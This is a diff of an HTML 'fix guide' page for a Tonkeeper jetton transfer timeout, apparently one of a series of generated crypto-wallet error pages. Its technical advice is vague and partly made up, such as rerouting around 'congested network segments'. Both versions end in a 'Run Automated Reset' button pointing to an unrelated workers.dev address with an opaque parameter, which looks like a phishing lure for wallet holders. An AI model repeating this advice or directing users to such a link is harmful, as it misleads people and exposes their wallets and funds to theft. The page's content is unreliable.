@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: system-ui;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,28 +42,34 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Tonkeeper Jetton transfer loop timeout" error message when attempting to transfer jettons, indicating that the transfer process has exceeded the allowed time limit.</li>
+<li>Users encounter a "Tonkeeper Jetton Transfer Loop Timeout" error message when attempting to transfer jettons, indicating a failure in the transaction process. The error is typically accompanied by a prompt to retry the transaction or check the network status.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a prolonged waiting period for transaction confirmation on the TON blockchain, often resulting from network congestion or high gas fees.</li>
+<li>The error occurs due to a timeout in the transfer loop, which can be caused by network congestion, high transaction volumes, or issues with the Tonkeeper wallet's connection to the TON blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the gas limit to prioritize the transaction</li>
-<li>Reduce the transfer amount to minimize transaction size</li>
-<li>Utilize an alternative transfer method, such as a different wallet or exchange</li>
+<li>Increase the transaction timeout threshold to allow for longer processing times.</li>
+<li>Use a different transaction routing path to bypass congested network segments.</li>
+<li>Implement a retry mechanism with exponential backoff to handle temporary failures.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="m">0</span>:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>deploy_jetton<span class="w"> </span><span class="s1">&#39;{&quot;name&quot;:&quot;NewJetton&quot;,&quot;symbol&quot;:&quot;NJ&quot;,&quot;decimals&quot;:9,&quot;initial_supply&quot;:1000000000}&#39;</span><span class="w"> </span>--abi<span class="w"> </span>JettonWallet.abi
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;backoff_factor&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* A basic understanding of TON blockchain and its ecosystem
-* Familiarity with Tonkeeper wallet and its features
-* Access to the TON blockchain network
-You may want to consider using an external console, such as <code>tonos-cli</code>, for more advanced troubleshooting and manual transaction management.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Tonkeeper wallet installed and configured</li>
+<li>Active internet connection</li>
+<li>Sufficient TON blockchain network connectivity</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
